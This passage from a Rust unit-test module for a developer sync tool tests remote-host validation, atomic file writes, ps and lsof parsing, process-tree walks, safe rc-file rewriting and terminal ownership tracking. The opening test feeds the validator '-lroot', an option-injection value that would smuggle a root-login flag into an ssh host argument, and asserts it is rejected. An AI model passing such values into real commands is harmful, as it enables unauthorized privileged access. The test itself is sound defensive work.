        assert!(validate_remote_host("-lroot").is_err());
        // A dash elsewhere is ordinary and must keep working.
        assert!(validate_remote_host("build-server-01").is_ok());
        assert!(validate_remote_host("deploy@build-01.example.com").is_ok());
    }

    #[test]
    fn write_atomic_leaves_the_old_file_intact_when_the_write_cannot_land() {
        let dir = scratch("atomic-write");
        std::fs::create_dir_all(&dir).unwrap();
        let target = dir.join("settings.json");
        std::fs::write(&target, "{\"keep\":true}").unwrap();

        // A directory where the file should be makes the rename fail. The point of the assertion is what survives: the original contents, not a truncated stump.
        let blocked = dir.join("blocked");
        std::fs::create_dir_all(&blocked).unwrap();
        assert!(write_atomic(&blocked, "new").is_err());
        assert_eq!(std::fs::read_to_string(&target).unwrap(), "{\"keep\":true}");

        // And the ordinary path replaces the whole file, leaving no temp file behind.
        write_atomic(&target, "{\"keep\":false}").unwrap();
        assert_eq!(std::fs::read_to_string(&target).unwrap(), "{\"keep\":false}");
        let leftovers: Vec<_> = std::fs::read_dir(&dir)
            .unwrap()
            .filter_map(|e| e.ok())
            .map(|e| e.file_name().to_string_lossy().to_string())
            .filter(|n| n.contains("aki-tmp"))
            .collect();
        assert!(leftovers.is_empty(), "temp file left behind: {:?}", leftovers);

        let _ = std::fs::remove_dir_all(&dir);
    }

    fn maps(rows: &[(u32, u32, Option<&str>)]) -> (HashMap<u32, u32>, HashMap<u32, String>) {
        let mut ppid = HashMap::new();
        let mut cwd = HashMap::new();
        for (pid, parent, dir) in rows {
            ppid.insert(*pid, *parent);
            if let Some(d) = dir {
                cwd.insert(*pid, d.to_string());
            }
        }
        (ppid, cwd)
    }

    #[test]
    fn ps_output_parses_into_pid_ppid_pairs() {
        let rows = parse_ps_rows(
            "  300   200 s000     01:23 -zsh\n  400   300 s000  00:04 npm run dev\ngarbage\n",
        );
        let map = ppids_from_rows(&rows);
        assert_eq!(map.get(&300), Some(&200));
        assert_eq!(map.get(&400), Some(&300));
        assert_eq!(map.len(), 2);
    }

    #[test]
    fn ps_command_column_keeps_its_own_spacing_and_is_never_cut_short() {
        // The command repeats BOTH the tty string and a pid — the exact case a `line.find(token)` implementation slices at the wrong offset.
        let rows = parse_ps_rows("  400   300 s000  00:04 /bin/my app/s000 --pid=400 -x\n");
        assert_eq!(rows.len(), 1);
        assert_eq!(rows[0].tty, "s000");
        assert_eq!(rows[0].etime, "00:04");
        assert_eq!(rows[0].command, "/bin/my app/s000 --pid=400 -x");
    }

    #[test]
    fn login_wrapper_is_matched_on_the_executable_not_a_substring() {
        assert!(is_login_wrapper("login -pf aki"));
        assert!(is_login_wrapper("/usr/bin/login -pf aki"));
        // A shell running something that merely CONTAINS "login" is the session, not a wrapper.
        assert!(!is_login_wrapper("-zsh"));
        assert!(!is_login_wrapper("git log --oneline"));
        assert!(!is_login_wrapper("./login-check.sh"));
        assert!(!is_login_wrapper("node scripts/login.js"));
    }

    #[test]
    fn ps_row_with_no_command_column_is_dropped_not_mangled() {
        // A kernel thread prints an empty command; `ps` still emits the row. Four columns and nothing after them means there is no session to describe.
        let rows = parse_ps_rows("  1   0 ??   10-00:00:01\n");
        assert!(rows.is_empty());
    }

    #[test]
    fn lsof_field_output_parses_into_pid_cwd_pairs() {
        let map = parse_lsof_cwds("p300\nn/Users/aki/proj\np400\nn/tmp\n");
        assert_eq!(map.get(&300).map(String::as_str), Some("/Users/aki/proj"));
        assert_eq!(map.get(&400).map(String::as_str), Some("/tmp"));
    }

    #[test]
    fn descendants_walk_the_whole_tree_and_exclude_the_root() {
        let (ppid, _) = maps(&[
            (200, 100, None),
            (300, 200, None),
            (400, 300, None),
            (900, 1, None), // unrelated
        ]);
        let mut kids = descendants_of(&ppid, &[100]);
        kids.sort();
        assert_eq!(kids, vec![200, 300, 400]);
    }

    /// A scratch path under the OS temp dir, unique per test. The rewrite tests must never touch a
    /// real `~/.zshrc` - that file is precisely what the code under test can destroy.
    fn scratch(name: &str) -> std::path::PathBuf {
        let dir = std::env::temp_dir().join(format!("aki-devsync-test-{}-{}", std::process::id(), name));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).expect("create scratch dir");
        dir
    }

    #[test]
    fn read_for_rewrite_absent_file_is_empty() {
        let dir = scratch("absent");
        let missing = dir.join("nope.rc");
        assert_eq!(read_for_rewrite(&missing).unwrap(), "");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn read_for_rewrite_returns_existing_content() {
        let dir = scratch("present");
        let file = dir.join("some.rc");
        std::fs::write(&file, "alias ll='ls -la'\n").unwrap();
        assert_eq!(read_for_rewrite(&file).unwrap(), "alias ll='ls -la'\n");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn read_for_rewrite_non_notfound_error_aborts() {
        // A directory is a portable, root-proof way to produce a read error that is NOT NotFound - the exact case `unwrap_or_default()` used to flatten into "" before overwriting the file.
        let dir = scratch("isdir");
        let err = read_for_rewrite(&dir).unwrap_err();
        assert!(err.contains("Nothing was written"), "error must say no write happened: {}", err);
        let _ = std::fs::remove_dir_all(&dir);
    }

    // ── session inventory (S1) ────────────────────────────────────────────────────────────────

    fn tree_of(rows: &[(u32, u32, &str)]) -> TerminalTree {
        let mut ppid_of = HashMap::new();
        let mut cwd_of = HashMap::new();
        let mut row_of = HashMap::new();
        for (pid, ppid, cwd) in rows {
            ppid_of.insert(*pid, *ppid);
            cwd_of.insert(*pid, cwd.to_string());
            row_of.insert(
                *pid,
                PsRow { pid: *pid, ppid: *ppid, tty: "s004".to_string(), etime: "00:01".to_string(), command: "-zsh".to_string() },
            );
        }
        TerminalTree { ppid_of, cwd_of, row_of }
    }

    #[test]
    fn is_subtree_root_true_when_the_parent_sits_elsewhere() {
        let tree = tree_of(&[(100, 1, "/Users/aki"), (200, 100, "/proj")]);
        assert!(is_subtree_root(&tree, 200));
    }

    #[test]
    fn is_subtree_root_false_when_the_parent_shares_the_same_cwd() {
        let tree = tree_of(&[(200, 100, "/proj"), (300, 200, "/proj")]);
        assert!(!is_subtree_root(&tree, 300));
    }

    #[test]
    fn is_subtree_root_false_when_the_parent_cwd_only_differs_by_a_trailing_slash() {
        let tree = tree_of(&[(200, 100, "/proj"), (300, 200, "/proj/")]);
        assert!(!is_subtree_root(&tree, 300));
    }

    #[test]
    fn is_subtree_root_true_when_the_parent_is_unknown() {
        let tree = tree_of(&[(200, 999, "/proj")]);
        assert!(is_subtree_root(&tree, 200));
    }

    #[test]
    fn is_subtree_root_false_for_a_pid_with_no_recorded_cwd() {
        let tree = tree_of(&[(200, 100, "/proj")]);
        assert!(!is_subtree_root(&tree, 404));
    }

    // ── spawn-origin ownership registry (S3) ─────────────────────────────────────────────────

    #[test]
    fn normalize_tty_strips_dev_tty_prefix_only() {
        assert_eq!(normalize_tty("/dev/ttys004"), "s004");
        assert_eq!(normalize_tty("s004"), "s004");
        assert_eq!(normalize_tty("??"), "??");
    }

    fn ps_row(pid: u32, tty: &str) -> PsRow {
        PsRow { pid, ppid: 1, tty: tty.to_string(), etime: "00:01".to_string(), command: "-zsh".to_string() }
    }

    #[test]
    fn reconcile_pins_the_lowest_pid_on_first_sight() {
        let ownership = TerminalOwnership::default();
        record_terminal_owner(&ownership, "/dev/ttys004", "proj-a".to_string());
        let rows: HashMap<u32, PsRow> = [(500, ps_row(500, "s004")), (300, ps_row(300, "s004"))].into();
        reconcile_terminal_owners(&ownership, &rows);
        let map = ownership.by_tty.lock().unwrap();
        assert_eq!(map.get("s004").unwrap().pid, Some(300));
    }

    #[test]
    fn reconcile_drops_an_entry_whose_tty_has_vanished() {
        let ownership = TerminalOwnership::default();
        record_terminal_owner(&ownership, "/dev/ttys004", "proj-a".to_string());
        reconcile_terminal_owners(&ownership, &HashMap::new());
        assert!(ownership.by_tty.lock().unwrap().is_empty());
    }

    #[test]
    fn reconcile_drops_an_entry_whose_pinned_pid_is_gone_even_though_the_tty_still_exists() {
        let ownership = TerminalOwnership::default();
        record_terminal_owner(&ownership, "/dev/ttys004", "proj-a".to_string());
        let rows: HashMap<u32, PsRow> = [(300, ps_row(300, "s004"))].into();
        reconcile_terminal_owners(&ownership, &rows); // pins pid 300
        // The tab closed and a NEW one was assigned the same recycled tty number.
        let rows: HashMap<u32, PsRow> = [(900, ps_row(900, "s004"))].into();
        reconcile_terminal_owners(&ownership, &rows);
        assert!(ownership.by_tty.lock().unwrap().is_empty());
    }

    #[test]
    fn reconcile_touches_no_other_entry() {
        let ownership = TerminalOwnership::default();
        record_terminal_owner(&ownership, "/dev/ttys004", "proj-a".to_string());
        record_terminal_owner(&ownership, "/dev/ttys005", "proj-b".to_string());
        let rows: HashMap<u32, PsRow> = [(300, ps_row(300, "s004"))].into(); // s005 has no live process
        reconcile_terminal_owners(&ownership, &rows);
        let map = ownership.by_tty.lock().unwrap();
        assert_eq!(map.len(), 1);
        assert_eq!(map.get("s004").unwrap().owner, "proj-a");
    }

    #[test]
    fn tag_terminal_launch_is_a_no_op_when_tty_is_empty() {
        let ownership = TerminalOwnership::default();
        tag_terminal_launch(&ownership, "", Some("proj-a".to_string()));
        assert!(ownership.by_tty.lock().unwrap().is_empty());
    }

    #[test]
    fn tag_terminal_launch_is_a_no_op_when_owner_is_absent() {
        let ownership = TerminalOwnership::default();
        tag_terminal_launch(&ownership, "/dev/ttys004", None);
        assert!(ownership.by_tty.lock().unwrap().is_empty());
    }

    #[test]
    fn tag_terminal_launch_records_when_both_are_present() {
        let ownership = TerminalOwnership::default();
        tag_terminal_launch(&ownership, "/dev/ttys004", Some("proj-a".to_string()));
        assert_eq!(owner_of(&ownership, "/dev/ttys004"), Some("proj-a".to_string()));
    }

    #[cfg(unix)]
    #[test]
    fn read_for_rewrite_permission_denied_aborts() {
        use std::os::unix::fs::PermissionsExt;
        let dir = scratch("perm");
        let file = dir.join("locked.rc");
        std::fs::write(&file, "export PATH=/usr/bin\n").unwrap();
        std::fs::set_permissions(&file, std::fs::Permissions::from_mode(0o000)).unwrap();
        // Skip rather than fail when the test happens to run as root, where mode 000 is not enforced.
        if std::fs::read_to_string(&file).is_err() {
            assert!(read_for_rewrite(&file).is_err());
        }
        let _ = std::fs::set_permissions(&file, std::fs::Permissions::from_mode(0o600));
        let _ = std::fs::remove_dir_all(&dir);
    }
}
